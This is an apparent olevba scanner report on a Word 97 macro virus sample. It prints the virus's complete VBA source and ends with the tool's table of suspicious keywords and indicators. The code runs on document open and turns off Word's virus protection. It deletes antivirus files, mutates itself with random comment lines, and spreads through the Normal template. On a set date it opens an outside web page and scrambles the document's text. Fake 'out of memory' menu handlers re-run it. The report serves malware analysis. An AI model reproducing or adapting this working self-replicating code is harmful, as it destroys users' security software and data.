olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1-a63b9ea21f7260f5bbba5cc55c5a32c1dd2dc157
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1-a63b9ea21f7260f5bbba5cc55c5a32c1dd2dc157 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Us689.bas 
in file: Virus.MSWord.VMPCK1-a63b9ea21f7260f5bbba5cc55c5a32c1dd2dc157 - OLE stream: 'Macros/VBA/Us689'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()

    ' Word97 Macro Virii Creation Kit
    ' ===============================
    ' Code by Jack Twoflower/LzŘ Vx
    ' ===============================
    ' W97M.BlackCat's fi(r)st

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Us689").Export "C:\Us689.sys"
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("Us689").CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("Us689").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
If Day(Now()) = 10 And Month(Now()) = 7 Then
ActiveDocument.FollowHyperlink Address:="http://www.extra.hu/blackcat/myvirus_infected.html", NewWindow:=False, AddHistory:=True
Dim a As Variant
Dim b As Variant
Selection.WholeStory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.WholeStory
Selection.Cut
WordBasic.Insert e$
End If
Set Dk40 = ActiveDocument.VBProject.VBComponents
Set Rx622 = NormalTemplate.VBProject.VBComponents
For y = 1 To Rx622.Count
If Rx622(y).Name = "Us689" Then Lk96 = True
Next y
For y = 1 To Dk40.Count
If Dk40(y).Name = "Us689" Then Bn483 = True
Next y
If Lk96 = True And Bn483 = True Then Exit Sub
If Lk96 = True And Bn483 <> True Then Dk40.Import "c:\Us689.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Lk96 <> True And Bn483 = True Then Rx622.Import "c:\Us689.sys": NormalTemplate.Save
If Day(Now()) = 31 Then MsgBox "This virus was created with W97MVCK by Jack Twoflower"
End Sub
Sub ExtrasMakro()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtVBCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub DateiDokVorlagen()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub FormatFormatvorlage()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.extra.hu/|URL                                          |
|          |blackcat/myvirus_inf|                                             |
|          |ected.html          |                                             |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

